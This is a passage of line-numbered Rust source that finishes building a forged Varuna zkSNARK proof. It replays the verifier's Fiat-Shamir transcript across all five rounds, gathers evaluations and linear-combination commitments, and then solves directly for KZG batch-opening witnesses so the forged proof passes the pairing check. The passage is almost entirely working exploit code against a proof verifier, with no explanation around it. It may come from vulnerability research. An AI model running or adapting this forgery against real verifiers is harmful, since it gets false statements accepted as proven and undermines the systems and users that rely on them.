275             let   input_domain   =     EvaluationDomain  ::  <  Fr  >  ::  new  (vk  .  circuit_info  .  num_public_inputs)    276                 .  ok_or_else  (  ||     anyhow!  (  "input domain"  ))  ?  ;    277             let   (padded_public_inputs_i, parsed_public_inputs_i)  :   (  Vec  <_>,   Vec  <_>)   =   public_inputs_i    278                 .  iter  ()    279                 .  map  (  |  input  |   {    280                     let   input_len   =   input  .  len  ()  .  max  (input_domain  .  size  ());    281                     let     mut   new_input   =     Vec  ::  with_capacity  (input_len);    282                      new_input  .  extend_from_slice  (input);    283                      new_input  .  resize  (input_len,   Fr  ::  zero  ());    284                     let   unformatted   =     prover  ::  ConstraintSystem  ::  unformat_public_input  (  &  new_input);    285                      (new_input, unformatted)    286                  })    287                 .  unzip  ();    288              public_inputs  .  insert  (vk  .  id, parsed_public_inputs_i);    289              padded_public_vec  .  push  (padded_public_inputs_i);    290              circuit_infos  .  insert  (vk  .  id,   &  vk  .  circuit_info);    291              circuit_ids  .  push  (vk  .  id);    292          }    293         for   (i, (vk,   &  batch_size))   in   vks_to_inputs  .  keys  ()  .  zip  (batch_sizes  .  values  ())  .  enumerate  () {    294              inputs_and_batch_sizes  .  insert  (vk  .  id, (batch_size, padded_public_vec[i]  .  as_slice  ()));    295          }    296
297         let   max_constraint_domain   =    298             EvaluationDomain  ::  <  Fr  >  ::  new  (max_num_constraints)  .  ok_or_else  (  ||     anyhow!  (  "constraint domain"  ))  ?  ;    299         let   max_variable_domain   =    300             EvaluationDomain  ::  <  Fr  >  ::  new  (max_num_variables)  .  ok_or_else  (  ||     anyhow!  (  "variable domain"  ))  ?  ;    301         let   max_non_zero_domain   =   max_non_zero_domain  .  ok_or_else  (  ||     anyhow!  (  "non-zero domain"  ))  ?  ;    302
303         let   comms   =     &  forged_proof  .  commitments;    304         let   first_round_info   =     AHPForR1CS  ::  <  Fr  ,   VarunaHidingMode  >  ::  first_round_polynomial_info  (batch_sizes  .  iter  ());    305         let     mut   first_comms_consumed   =     0  ;    306         let     mut   first_commitments   =   batch_sizes    307             .  iter  ()    308             .  flat_map  (  |  (circuit_id,   &  batch_size)  |   {    309                 let   first_comms   =   comms  .  witness_commitments[first_comms_consumed  ..  ][  ..  batch_size]    310                     .  iter  ()    311                     .  enumerate  ()    312                     .  map  (  |  (j, w_comm)  |   {    313                         LabeledCommitment  ::  new_with_info  (    314                             &  first_round_info[  &  witness_label  (  *  circuit_id,   "w"  , j)],    315                              w_comm  .  w,    316                          )    317                      });    318                  first_comms_consumed   +=   batch_size;    319                  first_comms    320              })    321             .  collect_vec  ();    322          first_commitments  .  push  (  LabeledCommitment  ::  new_with_info  (    323              first_round_info  .  get  (  "mask_poly"  )  .  ok_or_else  (  ||     anyhow!  (  "mask_poly info"  ))  ?  ,    324              comms  .  mask_poly  .  ok_or_else  (  ||     anyhow!  (  "mask_poly comm"  ))  ?  ,    325          ));    326         let   second_round_info   =     AHPForR1CS  ::  <  Fr  ,   VarunaHidingMode  >  ::  second_round_polynomial_info  ();    327         let   second_commitments   =   [  LabeledCommitment  ::  new_with_info  (  &  second_round_info[  "h_0"  ], comms  .  h_0)];    328         let   third_round_info   =     AHPForR1CS  ::  <  Fr  ,   VarunaHidingMode  >  ::  third_round_polynomial_info  (max_variable_domain  .  size  ());    329         let   third_commitments   =   [    330             LabeledCommitment  ::  new_with_info  (  &  third_round_info[  "g_1"  ], comms  .  g_1),    331             LabeledCommitment  ::  new_with_info  (  &  third_round_info[  "h_1"  ], comms  .  h_1),    332          ];    333         let   fourth_round_info   =    334             AHPForR1CS  ::  <  Fr  ,   VarunaHidingMode  >  ::  fourth_round_polynomial_info  (circuit_infos  .  clone  ()  .  into_iter  ());    335         let   fourth_commitments   =   comms    336             .  g_a_commitments    337             .  iter  ()    338             .  zip_eq  (comms  .  g_b_commitments  .  iter  ())    339             .  zip_eq  (comms  .  g_c_commitments  .  iter  ())    340             .  zip_eq  (circuit_ids  .  iter  ())    341             .  flat_map  (  |  (((g_a, g_b), g_c), circuit_id)  |   {    342                  [    343                     LabeledCommitment  ::  new_with_info  (  &  fourth_round_info[  &  witness_label  (  *  circuit_id,   "g_a"  ,   0  )],   *  g_a),    344                     LabeledCommitment  ::  new_with_info  (  &  fourth_round_info[  &  witness_label  (  *  circuit_id,   "g_b"  ,   0  )],   *  g_b),    345                     LabeledCommitment  ::  new_with_info  (  &  fourth_round_info[  &  witness_label  (  *  circuit_id,   "g_c"  ,   0  )],   *  g_c),    346                  ]    347              })    348             .  collect_vec  ();    349         let   fifth_round_info   =     AHPForR1CS  ::  <  Fr  ,   VarunaHidingMode  >  ::  fifth_round_polynomial_info  ();    350         let   fifth_commitments   =   [  LabeledCommitment  ::  new_with_info  (  &  fifth_round_info[  "h_2"  ], comms  .  h_2)];    351
352         let   circuit_commitments   =   vks_to_inputs  .  keys  ()  .  map  (  |  vk  |   vk  .  circuit_commitments  .  as_slice  ());    353         let     mut   sponge   =     Varuna  ::  init_sponge  (fs_parameters,   &  inputs_and_batch_sizes, circuit_commitments  .  clone  ());    354         Varuna  ::  absorb_labeled  (  &  first_commitments,   &mut   sponge);    355         let   (_, verifier_state)   =     AHPForR1CS  ::  <_,   VarunaHidingMode  >  ::  verifier_first_round  (    356             &  batch_sizes,    357             &  circuit_infos,    358              max_constraint_domain,    359              max_variable_domain,    360              max_non_zero_domain,    361             &mut   sponge,    362          )  ?  ;    363         Varuna  ::  absorb_labeled  (  &  second_commitments,   &mut   sponge);    364         let   (_, verifier_state)   =    365             AHPForR1CS  ::  <_,   VarunaHidingMode  >  ::  verifier_second_round  (verifier_state,   &mut   sponge, varuna_version)  ?  ;    366         let   verifier_state   =     match   varuna_version {    367             VarunaVersion  ::  V1     =>   verifier_state,    368             VarunaVersion  ::  V2     =>   {    369                 Varuna  ::  absorb_sums  (  &  forged_proof  .  third_msg  .  sums  .  clone  ()  .  into_iter  ()  .  flatten  ()  .  collect_vec  (),   &mut   sponge);    370                 let   (_, verifier_state)   =     AHPForR1CS  ::  <_,   VarunaHidingMode  >  ::  verifier_prepare_third_round  (    371                      verifier_state,    372                     &  batch_sizes,    373                     &  circuit_infos,    374                     &mut   sponge,    375                  )  ?  ;    376                  verifier_state    377              }    378          };    379         match   varuna_version {    380             VarunaVersion  ::  V1     =>     Varuna  ::  absorb_labeled_with_sums  (    381                 &  third_commitments,    382                 &  forged_proof  .  third_msg  .  sums  .  clone  ()  .  into_iter  ()  .  flatten  ()  .  collect_vec  (),    383                 &mut   sponge,    384              ),    385             VarunaVersion  ::  V2     =>     Varuna  ::  absorb_labeled  (  &  third_commitments,   &mut   sponge),    386          }    387         let   (_, verifier_state)   =     AHPForR1CS  ::  <_,   VarunaHidingMode  >  ::  verifier_third_round  (verifier_state,   &mut   sponge)  ?  ;    388         Varuna  ::  absorb_labeled_with_sums  (  &  fourth_commitments,   &  forged_proof  .  fourth_msg  .  sums,   &mut   sponge);    389         let   (_, verifier_state)   =     AHPForR1CS  ::  <_,   VarunaHidingMode  >  ::  verifier_fourth_round  (verifier_state,   &mut   sponge)  ?  ;    390         Varuna  ::  absorb_labeled  (  &  fifth_commitments,   &mut   sponge);    391         let   verifier_state   =     AHPForR1CS  ::  <_,   VarunaHidingMode  >  ::  verifier_fifth_round  (verifier_state,   &mut   sponge)  ?  ;    392
393         let   (query_set, verifier_state)   =     AHPForR1CS  ::  <_,   VarunaHidingMode  >  ::  verifier_query_set  (verifier_state);    394          sponge  .  absorb_nonnative_field_elements  (forged_proof  .  evaluations  .  to_field_elements  ());    395
396         let     mut   evaluations   =     PCEvaluations  ::  new  ();    397         let     mut   current_circuit_id   =     String  ::  new  ();    398         let     mut   circuit_index  :     i64     =     -  1  ;    399         let   query_set   =   query_set  .  to_set  ();    400         for   (label, (_point_name, q))   in     &  query_set {    401             if     AHPForR1CS  ::  <  Fr  ,   VarunaHidingMode  >  ::  LC_WITH_ZERO_EVAL  .  contains  (  &  label  .  as_ref  ()) {    402                  evaluations  .  insert  ((label  .  clone  (),   *  q),   Fr  ::  zero  ());    403              }   else   {    404                 if   label   !=     "g_1"   {    405                     let   circuit_id   =     CircuitId  ::  from_witness_label  (label)  .  to_string  ();    406                     if   circuit_id   !=   current_circuit_id {    407                          circuit_index   +=     1  ;    408                          current_circuit_id   =   circuit_id;    409                      }    410                  }    411                 let   eval   =   forged_proof    412                     .  evaluations    413                     .  get  (circuit_index   as     usize  , label)    414                     .  ok_or_else  (  ||     anyhow!  (  "missing eval for {label}"  ))  ?  ;    415                  evaluations  .  insert  ((label  .  clone  (),   *  q), eval);    416              }    417          }    418
419         let   lc_s   =     AHPForR1CS  ::  <_,   VarunaHidingMode  >  ::  construct_linear_combinations  (    420             &  public_inputs,    421             &  evaluations,    422             &  forged_proof  .  third_msg,    423             &  forged_proof  .  fourth_msg,    424             &  verifier_state,    425              varuna_version,    426          )  ?  ;    427
428         let   commitments_vec  :     Vec  <_>   =   circuit_commitments    429             .  into_iter  ()    430             .  flatten  ()    431             .  zip_eq  (  AHPForR1CS  ::  <  Fr  ,   VarunaHidingMode  >  ::  index_polynomial_info  (circuit_ids  .  iter  ())  .  values  ())    432             .  map  (  |  (c, info)  |     LabeledCommitment  ::  new_with_info  (info,   *  c))    433             .  chain  (first_commitments)    434             .  chain  (second_commitments)    435             .  chain  (third_commitments)    436             .  chain  (fourth_commitments)    437             .  chain  (fifth_commitments)    438             .  collect  ();    439         let   label_comm_map   =   commitments_vec  .  iter  ()  .  map  (  |  c  |   (c  .  label  (), c))  .  collect  ::  <  BTreeMap  <_, _>>();    440
441         let     mut   pc_evaluations   =   evaluations  .  clone  ();    442         let     mut   lc_commitments  :     Vec  <  LabeledCommitment  <  KZGCommitment  <  Pairing  >>>   =     Vec  ::  new  ();    443         for   lc   in   lc_s  .  values  () {    444             let   lc_label   =   lc  .  label  ()  .  to_string  ();    445             let   num_polys   =   lc  .  len  ();    446             let     mut   degree_bound   =     None  ;    447             let     mut   coeffs_and_comms  :     Vec  <(  Fr  ,   KZGCommitment  <  Pairing  >)>   =     Vec  ::  new  ();    448             for   (coeff, term)   in   lc  .  iter  () {    449                 if   term  .  is_one  () {    450                     for   ((label, _), eval)   in   pc_evaluations  .  iter_mut  () {    451                         if   label   ==     &  lc_label {    452                             *  eval   -=   coeff;    453                          }    454                      }    455                  }   else   {    456                     let   label  :     &  String     =   term  .  try_into  ()  .  map_err  (  |  _  |     anyhow!  (  "LC term try_into"  ))  ?  ;    457                     let   cur_comm   =   label_comm_map[label   as     &  str  ];    458                     if   cur_comm  .  degree_bound  ()  .  is_some  () {    459                         ensure!  (num_polys   ==     1  );    460                         ensure!  (coeff  .  is_one  ());    461                          degree_bound   =   cur_comm  .  degree_bound  ();    462                      }    463                      coeffs_and_comms  .  push  ((  *  coeff,   *  cur_comm  .  commitment  ()));    464                  }    465              }    466             let   combined  :     G1Projective     =   coeffs_and_comms  .  into_iter  ()  .  map  (  |  (coeff, comm)  |   comm  .  0     *   coeff)  .  sum  ();    467              lc_commitments  .  push  (  LabeledCommitment  ::  new  (lc_label,   KZGCommitment  (combined  .  to_affine  ()), degree_bound));    468          }    469         let   lc_commitments  :     BTreeMap  <  String  ,   &  LabeledCommitment  <  KZGCommitment  <  Pairing  >>>   =    470              lc_commitments  .  iter  ()  .  map  (  |  c  |   (c  .  label  ()  .  to_owned  (), c))  .  collect  ();    471
472         let     mut   challenge_sponge   =   sponge;    473         let     mut   query_to_labels_map  :     BTreeMap  <  String  , (  Fr  ,   BTreeSet  <  String  >)>   =     BTreeMap  ::  new  ();    474         for   (label, (point_name, point))   in   query_set  .  iter  () {    475             let   labels   =   query_to_labels_map  .  entry  (point_name  .  clone  ())  .  or_insert  ((  *  point,   BTreeSet  ::  new  ()));    476              labels  .  1.  insert  (label  .  clone  ());    477          }    478         ensure!  (query_to_labels_map  .  len  ()   ==     3  ,   "expected 3 query points (alpha, beta, gamma)"  );    479
480         let     mut   combined_commitment   =     G1Projective  ::  zero  ();    481         let     mut   combined_value   =     Fr  ::  zero  ();    482         let     mut   randomizer   =     Fr  ::  one  ();    483         let     mut   query_data   =     Vec  ::  with_capacity  (query_to_labels_map  .  len  ());    484         for   (_point_name, (point, labels))   in   query_to_labels_map {    485             for   label   in   labels {    486                 let   challenge   =   challenge_sponge  .  squeeze_short_nonnative_field_element  ::  <  Fr  >();    487                 let   commitment   =   lc_commitments[  &  label];    488                 let   value   =   pc_evaluations[  &  (label, point)];    489                 let   coeff   =   randomizer   *   challenge;    490                 if   commitment  .  degree_bound  ()  .  is_some  () {    491                     ensure!  (commitment  .  commitment  ()  .  0.  is_zero  ());    492                  }   else   {    493                      combined_commitment   +=   commitment  .  commitment  ()  .  0     *   coeff;    494                      combined_value   +=   value   *   coeff;    495                  }    496              }    497              query_data  .  push  ((randomizer, point));    498              randomizer   =   challenge_sponge  .  squeeze_short_nonnative_field_element  ::  <  Fr  >();    499          }    500
501         let   (r_0, z_0)   =   query_data[  0  ];    502         let   (r_1, z_1)   =   query_data[  1  ];    503         ensure!  (z_0   !=   z_1);    504
505         let   target   =   universal_verifier  .  vk  .  g   *   combined_value   -   combined_commitment;    506         let   witness_0   =   target   *   (r_0   *   (z_0   -   z_1))  .  inverse  ()  .  ok_or_else  (  ||     anyhow!  (  "singular query points"  ))  ?  ;    507         let   witness_1   =     -  witness_0   *   (r_0   /   r_1);    508         let   witness_2   =     G1Projective  ::  zero  ();    509
510         let   make_kzg   =     |  w  :     G1Projective  |     KZGProof  ::  <  Pairing  > { w  :   w  .  to_affine  (), random_v  :     Some  (  Fr  ::  zero  ()) };    511          forged_proof  .  pc_proof   =    512             BatchLCProof   { proof  :     BatchProof  (  vec!  [  make_kzg  (witness_0),   make_kzg  (witness_1),   make_kzg  (witness_2)]) };    513
514         Ok  (forged_proof)    515   }
```
